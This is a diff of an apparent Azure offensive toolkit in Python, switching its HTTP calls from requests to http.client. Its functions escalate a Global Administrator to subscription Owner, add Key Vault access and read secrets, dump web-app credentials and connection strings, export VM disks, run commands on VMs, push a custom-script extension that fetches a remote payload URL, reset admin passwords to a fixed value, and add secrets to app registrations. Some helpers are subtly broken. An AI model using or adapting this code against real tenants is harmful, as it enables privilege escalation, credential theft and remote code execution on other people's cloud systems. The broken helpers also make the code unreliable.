@@ -1,17 +1,17 @@
-import requests
-import readline
 import base64
 import json, sys
 import uuid
 import os
 import random
 import string
-from prettytable import PrettyTable
+import http.client
+import urllib
 import subprocess
 from urllib.parse import urlparse
 from xml.dom.minidom import parse
 from xml.dom.minidom import parseString
 import xml.dom.minidom
+import ssl
 
 Token = None
 accessTokenGraph = None
@@ -25,32 +25,113 @@ hasMgmtAccess = False
 hasVaultEnabled = False
 TrackLog = []
 
+# Adapted From http://stackoverflow.com/questions/5909873/how-can-i-pretty-print-ascii-tables-with-python
+def make_table(columns, data):
+    """Create an ASCII table and return it as a string.
 
-class SimpleCompleter(object):
+    Pass a list of strings to use as columns in the table and a list of
+    dicts. The strings in 'columns' will be used as the keys to the dicts in
+    'data.'
 
-    def __init__(self, options):
-        self.options = sorted(options)
-        return
+    """
+    # Calculate how wide each cell needs to be
+    cell_widths = {}
+    for c in columns:
+        lens = []
+        values = [lens.append(len(str(d.get(c, "")))) for d in data]
+        lens.append(len(c))
+        lens.sort()
+        cell_widths[c] = max(lens)
 
-    def complete(self, text, state):
-        response = None
-        if state == 0:
-            # This is the first time for this text, so build a match list.
-            if text:
-                self.matches = [s
-                                for s in self.options
-                                if s and s.startswith(text)]
-            else:
-                self.matches = self.options[:]
+    # Used for formatting rows of data
+    row_template = "|" + " {} |" * len(columns)
 
-        # Return the state'th item from the match list,
-        # if we have that many.
-        try:
-            response = self.matches[state]
-        except IndexError:
-            response = None
-        return response
+    # CONSTRUCT THE TABLE
 
+    # The top row with the column titles
+    justified_column_heads = [c.ljust(cell_widths[c]) for c in columns]
+    header = row_template.format(*justified_column_heads)
+    # The second row contains separators
+    sep = "|" + "-" * (len(header) - 2) + "|"
+    end = "-" * len(header)
+    title = "-" * len(header)
+    # Rows of data
+    rows = []
+
+    for d in data:
+        fields = [str(d.get(c, "")).ljust(cell_widths[c]) for c in columns]
+        row = row_template.format(*fields)
+        rows.append(row)
+    rows.append(end)
+    return "\n".join([title,header, sep] + rows)
+def sendGETRequest(url, Token):
+    object = {}
+    o = urlparse(url)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + str(Token)
+    }
+    conn.request("GET", str(o.path) + "/?" + str(o.query), "", headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+
+def sendPOSTRequest(url, body, Token):
+    object = {}
+    o = urlparse(url)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + str(Token)
+    }
+    if body is not None:
+        body = json.dumps(body)
+    conn.request("POST", str(o.path) + "/?" + str(o.query), body, headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+def sendPUTRequest(url, body, Token):
+    object = {}
+    o = urlparse(url)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + str(Token)
+    }
+    if body is not None:
+        body = json.dumps(body)
+    conn.request("PUT", str(o.path) + "/?" + str(o.query), body, headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
 def get_random_string(size):
     chars = string.ascii_lowercase+string.ascii_uppercase+string.digits
     ''.join(random.choice(chars) for _ in range(size))
@@ -132,8 +213,9 @@ def currentScope():
     if Token is None:
         print("No Token has been set.")
     else:
-        check = Token.split(".")[1]
-        audAttribue = json.loads(base64.b64decode(check))['aud']
+        b64_string = Token.split(".")[1]
+        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
+        audAttribue = json.loads(base64.b64decode(b64_string))['aud']
         strA = []
         if hasGraphAccess or "graph.microsoft.com" in audAttribue:
             strA.append("Graph enabled")
@@ -154,59 +236,47 @@ def currentProfile():
         else:
             print(strigify[1] + "\\" + strigify[0])
 
+def RD_ListAllVMs():
+    global Token
+    result = []
+    rs = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in rs['json']['value']:
+        for res in getResGroup(sub['subscriptionId'])['value']:
+            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", Token)
+            for item in rsVM['json']['value']:
+                if 'identity' not in item:
+                    item['identity'] = "N/A"
+
+                item['subscriptionId'] = sub['subscriptionId']
+                item['resourceGroup'] = res['name']
+                result.append(item)
+    return result
+
 def RD_ListAllUsers():
     global accessTokenGraph
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + accessTokenGraph
-    }
-    r = requests.get("https://graph.microsoft.com/v1.0/users/",
-                     headers=headers)
-    return r.json()
+    r = sendGETRequest("https://graph.microsoft.com/v1.0/users/", accessTokenGraph)
+    return r["json"]
 
-
-'''
-This attack path exploits the Global Administrator to modify privileges to Azure Resources
-Useful when the account has only access to Azure AD, and no access to Azure Subscriptions
-@required_privilege: Global Administrator
-@success: No output from API
-'''
 def GA_ElevateAccess():
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.post(
-        "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01",
-        headers=headers)
-    result = r.text
+    r = sendPOSTRequest("https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01", None, Token)
+    result = r['response']
     if result == "":
         return "Exploit Success!"
     else:
         return "Exploit Failed."
 
-'''
-This API help to abuse Global Administrator with privileges to Azure Resources to assign Owner subscription privileges
-@required_privilege: Global Administrator w/Azure Resources privileges
-@success: Response Context
-'''
 def GA_AssignSubscriptionOwnerRole(subscriptionId):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.put(
+    r = sendPUTRequest(
         "https://management.azure.com/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2015-07-01",
-        json={
+        {
               "properties": {
                 "roleDefinitionId": "/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
                 "principalId": str(parseUPNObjectId())
               }
-            },
-        headers=headers)
-    result = r.json()
+        },Token)
+    result = r['json']
     if result['error']:
         return "Exploit Failed. Abort."
     else:
@@ -215,47 +285,28 @@ def GA_AssignSubscriptionOwnerRole(subscriptionId):
 
 def RD_AddAppSecret():
     global accessTokenGraph
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + accessTokenGraph
-    }
-    r = requests.get(
-        "https://graph.microsoft.com/v1.0/applications",
-        headers=headers)
-    result = r.json()
-    return result
+    r = sendGETRequest("https://graph.microsoft.com/v1.0/applications", accessTokenGraph)
+    return r['json']
 
 def getResGroup(subid):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.get("https://management.azure.com/subscriptions/"+subid+"/resourcegroups?api-version=2021-04-01",headers=headers)
-    return r.json()
+    r = sendGETRequest("https://management.azure.com/subscriptions/"+subid+"/resourcegroups?api-version=2021-04-01", Token)
+    return r['json']
 
 
 def getArmTempPerResGroup(subid,resgroup):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    r = requests.get("https://management.azure.com/subscriptions/"+subid+"/resourcegroups/"+resgroup+"/providers/Microsoft.Resources/deployments/?api-version=2021-04-01",headers=headers)
-    return r.json()
+    r = sendGETRequest("https://management.azure.com/subscriptions/"+subid+"/resourcegroups/"+resgroup+"/providers/Microsoft.Resources/deployments/?api-version=2021-04-01", Token)
+    return r['json']
 
 def RD_ListExposedWebApps():
     global Token
     result = []
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in r['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
-            rsVM = requests.get("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Web/sites?api-version=2022-03-01", headers=headers)
-            for item in rsVM.json()['value']:
+            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Web/sites?api-version=2022-03-01", Token)
+            for item in rsVM['json']['value']:
                 if 'identity' not in item:
                     item['identity'] = "N/A"
 
@@ -263,89 +314,46 @@ def RD_ListExposedWebApps():
                 item['resourceGroup'] = res['name']
                 result.append(item)
     return result
-def RD_ListAllVMs():
-    global Token
-    result = []
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
-        for res in getResGroup(sub['subscriptionId'])['value']:
-            rsVM = requests.get("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", headers=headers)
-            for item in rsVM.json()['value']:
-                if 'identity' not in item:
-                    item['identity'] = "N/A"
 
-                item['subscriptionId'] = sub['subscriptionId']
-                item['resourceGroup'] = res['name']
-                result.append(item)
-    return result
 def RD_ListAllDeployments():
     global Token
     result = []
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
-        rsVM = requests.get("https://management.azure.com/subscriptions/"+sub["subscriptionId"]+"/providers/Microsoft.Web/sites?api-version=2022-03-01", headers=headers)
-        for item in rsVM.json()['value']:
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in r['json']['value']:
+        rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub["subscriptionId"]+"/providers/Microsoft.Web/sites?api-version=2022-03-01", Token)
+        for item in rsVM['json']['value']:
             result.append(item)
     return result
 
 def RD_ListAllACRs():
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
-        r = requests.get(
-            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01",
-            headers=headers)
-        return r.json()
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in r['json']['value']:
+        rsub = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01", Token)
+        return rsub['json']
     return False
 
 def HLP_GetACRCreds(acrId):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + accessTokenVault
-    }
-    rs = requests.post("https://management.azure.com/"+acrId+"/listCredentials?api-version=2019-05-01",
-        headers=headers)
-    if rs.status_code == 200:
-        return rs.json()
+    r = sendGETRequest("https://management.azure.com/"+acrId+"/listCredentials?api-version=2019-05-01", Token)
+    if r["status_code"] == 200:
+        return r['json']
     else:
         return "Unable to fetch data ACR."
 
 def HLP_ReadVaultSecretContent(SecretIdLink):
-    global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + accessTokenVault
-    }
-    rs = requests.get(
-        SecretIdLink+"?api-version=7.3",
-        headers=headers)
-    if rs.status_code == 200:
-        return "OK|" + rs.json()['value']
+    global accessTokenVault
+    rs = sendGETRequest(SecretIdLink+"?api-version=7.3",accessTokenVault)
+    if rs['status_code'] == 200:
+        return "OK|" + rs['json']['value']
     else:
-        return "ERROR|Operation Failed: " + rs.json()['error']['message']
+        return "ERROR|Operation Failed: " + rs['json']['error']['message']
 
 def HLP_AddVaultACL(vaultId):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.put(
+    rs = sendPUTRequest(
         "https://management.azure.com/" + vaultId + "/accessPolicies/add?api-version=2021-10-01",
-        json = {
+        {
               "properties": {
                 "accessPolicies": [
                   {
@@ -367,79 +375,54 @@ def HLP_AddVaultACL(vaultId):
                   }
                 ]
               }
-            },
-        headers=headers)
-    if rs.status_code == 201 or rs.status_code == 200:
+            },Token)
+    if rs['status_code'] == 201 or rs['status_code'] == 200:
         return True
     else:
         return False
 
 def HLP_GetSecretsInVault(vaultName):
-    global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + accessTokenVault
-    }
-    rs = requests.get(
+    global accessTokenVault
+    rs = sendGETRequest(
         "https://"+str(vaultName).lower()+".vault.azure.net/secrets?api-version=7.3",
-        headers=headers)
-    if rs.status_code == 200:
+        accessTokenVault)
+    if rs['status_code'] == 200:
         return "OK|"
     else:
-        return "ERROR|Operation Failed: " + rs.json()['error']['message']
+        return "ERROR|Operation Failed: " + rs['json']['error']['message']
 
 def HLP_GetSecretsInVaultNoStrings(vaultName):
-    global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + accessTokenVault
-    }
-    rs = requests.get(
-        "https://"+str(vaultName).lower()+".vault.azure.net/secrets?api-version=7.3",
-        headers=headers)
-    if rs.status_code == 200:
-        return rs.json()['value']
+    global accessTokenVault
+    rs = sendGETRequest("https://"+str(vaultName).lower()+".vault.azure.net/secrets?api-version=7.3", accessTokenVault)
+    if rs["status_code"] == 200:
+        return rs['json']['value']
     else:
-        return rs.json()['error']['message']
+        return rs['json']['error']['message']
 
 def HLP_GetSecretValueTXT(vaultSecretId):
-    global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + accessTokenVault
-    }
-    rs = requests.get(vaultSecretId+"?api-version=7.3",
-        headers=headers)
-    if rs.status_code == 200:
-        return rs.json()['value']
+    global accessTokenVault
+    rs = sendGETRequest(vaultSecretId+"?api-version=7.3",accessTokenVault)
+    if rs['status_code'] == 200:
+        return rs['json']['value']
     else:
-        return rs.json()['error']['message']
+        return rs['json']['error']['message']
 
 def HLP_GetVMInstanceView(subscriptionId,resourceGroupName,vmName):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/instanceView?api-version=2022-08-01", headers=headers)
-    if rs.status_code == 200:
-        return rs.json()['statuses'][1]['code']
+    rs = sendGETRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/instanceView?api-version=2022-08-01", Token)
+    if rs['status_code'] == 200:
+        return rs['json']['statuses'][1]['code']
     else:
-        print(rs.json())
         return "Unable to fetch VM data."
 
 def RD_ListAllVMs():
     global Token
     result = []
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in r['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
-            rsVM = requests.get("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", headers=headers)
-            for item in rsVM.json()['value']:
+            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", Token)
+            for item in rsVM['json']['value']:
                 if 'identity' not in item:
                     item['identity'] = "N/A"
 
@@ -451,15 +434,11 @@ def RD_ListAllVMs():
 def RD_ListAllVaults():
     global Token
     result = []
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
+    rs = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in rs['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
-            rsVM = requests.get("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01", headers=headers)
-            for item in rsVM.json()['value']:
+            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01", Token)
+            for item in rsVM['json']['value']:
                 item['subscriptionId'] = sub['subscriptionId']
                 item['resourceGroup'] = res['name']
                 result.append(item)
@@ -467,15 +446,11 @@ def RD_ListAllVaults():
 def RD_ListAllStorageAccounts():
     global Token
     result = []
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in r['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
-            rsVM = requests.get("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01", headers=headers)
-            for item in rsVM.json()['value']:
+            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01", Token)
+            for item in rsVM['json']['value']:
                 item['subscriptionId'] = sub['subscriptionId']
                 item['resourceGroup'] = res['name']
 
@@ -491,40 +466,31 @@ def RD_ListAllStorageAccounts():
 
                 result.append(item)
     return result
-def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName, location):
+def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
+    req = {
+        "access": "read",
+        "durationInSeconds": 86400
     }
-    rs = requests.post("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/disks/"+vmDiskName+"/beginGetAccess?api-version=2022-03-02",
-                      json={
-                          "access": "read",
-                          "durationInSeconds": 86400
-                      },
-                      headers=headers)
-
-    if rs.status_code == 202:
-        rsAsync = requests.get(str(rs.headers['Location']),headers=headers)
-        return "Disk Ready! The SAS Download For the next 24 hours (Disk:" + vmDiskName + "): " + rsAsync.json()['accessSAS']
+    rs = sendPOSTRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/disks/"+vmDiskName+"/beginGetAccess?api-version=2022-03-02", req, Token)
+    if rs['status_code'] == 202:
+        rsAsync = sendGETRequest(str(rs['headers']['Location']),Token)
+        return "Disk Ready! The SAS Download For the next 24 hours (Disk:" + vmDiskName + "): " + rsAsync['json']['accessSAS']
     else:
         return "Failed to generate SAS link for Disk."
 def CON_GetPublishProfileBySite(SiteId):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
     output = []
-    rs = requests.post("https://management.azure.com/"+SiteId+"/publishxml?api-version=2022-03-01", headers=headers)
-    rsConf = requests.get("https://management.azure.com/"+SiteId+"/config/web?api-version=2022-03-01", headers=headers)
-    if rs.status_code == 200:
-        DOMTree = xml.dom.minidom.parseString(rs.text)
+    rs = sendPOSTRequest("https://management.azure.com/"+SiteId+"/publishxml?api-version=2022-03-01", None, Token)
+    rsConf = sendGETRequest("https://management.azure.com/"+SiteId+"/config/web?api-version=2022-03-01", Token)
+    if rs["status_code"] == 200:
+        print(rs["response"])
+        DOMTree = xml.dom.minidom.parseString(rs["response"])
         xmlContent = DOMTree.documentElement
         profiles = xmlContent.getElementsByTagName('publishProfile')
 
-        if rsConf.status_code == 200:
-            connectionStrings = rsConf.json()['properties']['connectionStrings']
+        if rsConf["status_code"] == 200:
+            connectionStrings = rsConf['json']['properties']['connectionStrings']
             if connectionStrings is not None:
                 output.append(
                     {"name": "ConnectionStrings", "user": str("\n".join(connectionStrings)), "pwd": "", "host": ""})
@@ -547,14 +513,10 @@ def CON_GetPublishProfileBySite(SiteId):
 
 def CON_VMExtensionExecution(subscriptionId, location, resourceGroupName, vmName, PayloadURL):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
     vmExtensionName = get_random_string(20)
-    r = requests.put(
+    r = sendPUTRequest(
         "https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/" + resourceGroupName + "/providers/Microsoft.Compute/virtualMachines/" + vmName + "/extensions/" + vmExtensionName + "?api-version=2022-08-01",
-        json={
+        {
             "location": location,
             "properties": {
                 "publisher": "Microsoft.Compute",
@@ -566,47 +528,38 @@ def CON_VMExtensionExecution(subscriptionId, location, resourceGroupName, vmName
                     "fileUris": [PayloadURL]
                 }
             }
-        },
-        headers=headers)
-    if r.status_code == 201:
+        },Token)
+    if r['status_code'] == 201:
         return "Created! It should be ready within 5-10 min."
     else:
-        return "Failed to create VM Extension.\nReason: " + str(r.json()['error']['message'])
+        return "Failed to create VM Extension.\nReason: " + str(r['json']['error']['message'])
 
 def CON_VMRunCommand(subscriptionId, resourceGroupName, osType, vmName, Command):
     global Token
-    headers = {
-        'Content-Type': 'text/json',
-        'Authorization': 'Bearer ' + Token
-    }
+
     if osType == "Windows":
         exec = "RunPowerShellScript"
     else:
         exec = "RunShellScript"
 
-    rs = requests.post("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/runCommand?api-version=2022-08-01",
-        json={
-            "commandId": exec,
-            "script": [Command]
-        }, headers=headers)
-
-    if rs.status_code == 202 or rs.status_code == 200:
+    req = {
+        "commandId": exec,
+        "script": [Command]
+    }
+    rs = sendPOSTRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/runCommand?api-version=2022-08-01",req, Token)
+    if rs['status_code'] == 202 or rs['status_code'] == 200:
         return "Successfully Created Shell Script."
     else:
         return "Failed to Create Shell Script."
 
 
 
-def CON_VMExtensionResetPwd(subscriptionId, location, resourceGroupName, vmName, vmExtensionName, adminAccount):
+def CON_VMExtensionResetPwd(subscriptionId, location, resourceGroupName, vmName, adminAccount):
     global Token
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    vmExtensionName = get_random_string(20)
-    r = requests.put(
+    vmExtensionName = "RandomExtNas" + get_random_string(8)
+    r = sendPUTRequest(
         "https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/extensions/"+vmExtensionName+"?api-version=2022-08-01",
-        json={
+        {
               "location": location,
               "properties": {
                 "publisher": "Microsoft.Compute",
@@ -617,26 +570,19 @@ def CON_VMExtensionResetPwd(subscriptionId, location, resourceGroupName, vmName,
                     "password": "secretPass123"
                 }
               }
-            },
-        headers=headers)
-    if r.status_code == 201:
+            },Token)
+    if r['status_code'] == 201:
         return "Created! It should be ready within 5-10 min. \nLogin to "+vmName+" using " + adminAccount + ":secretPass123 as login details."
     else:
-        return "Failed to create VM Extension.\nReason: " + str(r.json()['error']['message'])
+        return "Failed to create VM Extension.\nReason: " + str(r['json']['error']['message'])
 
 def RD_ListAutomationAccounts():
     global Token
     result = []
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
-        r = requests.get(
-            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22",
-            headers=headers)
-        for item in r.json()['value']:
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in r['json']['value']:
+        rsub = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22", Token)
+        for item in rsub['json']['value']:
             item['subscriptionId'] = sub['subscriptionId']
             result.append(item)
     return result
@@ -644,18 +590,12 @@ def RD_ListAutomationAccounts():
 def RD_ListRunBooksByAutomationAccounts():
     global Token
     result = []
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
-        pathToAutomationAccount = requests.get(
-            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22",
-            headers=headers)
-        for automationAccount in pathToAutomationAccount.json()['value']:
-            GetRunBook = requests.get("https://management.azure.com/" + str(automationAccount['id']) + "/runbooks?api-version=2019-06-01",headers=headers)
-            for item in GetRunBook.json()['value']:
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in r['json']['value']:
+        pathToAutomationAccount = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22", Token)
+        for automationAccount in pathToAutomationAccount['json']['value']:
+            GetRunBook = sendGETRequest("https://management.azure.com/" + str(automationAccount['id']) + "/runbooks?api-version=2019-06-01", Token)
+            for item in GetRunBook['json']['value']:
                 item['subscriptionId'] = str(sub['subscriptionId'])
                 item['automationAccount'] = str(automationAccount['name'])
                 result.append(item)
@@ -663,15 +603,9 @@ def RD_ListRunBooksByAutomationAccounts():
 
 def RD_ListARMTemplates():
     global Token
-
     finalResult = []
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + Token
-    }
-
-    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
-    for sub in rs.json()['value']:
+    rs = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    for sub in rs['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
             for template in getArmTempPerResGroup(sub['subscriptionId'], res['name'])['value']:
                 currenttemplate = template
@@ -688,38 +622,28 @@ def RD_ListARMTemplates():
     return finalResult
 def CHK_AppRegOwner(appId):
     global accessTokenGraph
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + accessTokenGraph
-    }
-    r = requests.get("https://graph.microsoft.com/v1.0/applications?$filter=appId eq '" + appId + "'",
-                     headers=headers)
-    appData = r.json()['value'][0]['id']
-    AppOwners = requests.get("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/owners",headers=headers)
-    if str(parseUPN()) in AppOwners.text:
+    r = sendGETRequest("https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"), accessTokenGraph)
+    appData = r['json']['value'][0]['id']
+    AppOwners = sendGETRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/owners", accessTokenGraph)
+    if str(parseUPN()) in AppOwners["response"]:
         return "Yes! Try Exploit: Reader/abuseServicePrincipals"
     else:
         return "N/A"
 
 def RD_addPasswordForEntrepriseApp(appId):
     global accessTokenGraph
-    headers = {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + accessTokenGraph
-    }
-    r = requests.get("https://graph.microsoft.com/v1.0/applications?$filter=appId eq '" + appId + "'",
-                     headers=headers)
-    appData = r.json()['value'][0]['id']
-    addSecretPwd = requests.post(
-        "https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword",
-        json={
+    r = sendGETRequest(
+        "https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"),
+        accessTokenGraph)
+    appData = r['json']['value'][0]['id']
+    req = {
             "passwordCredential": {
                 "displayName": "Password"
             }
-        },
-        headers=headers)
-    if addSecretPwd.status_code == 200:
-        pwdOwn = addSecretPwd.json()
+    }
+    addSecretPwd = sendPOSTRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword", req, accessTokenGraph)
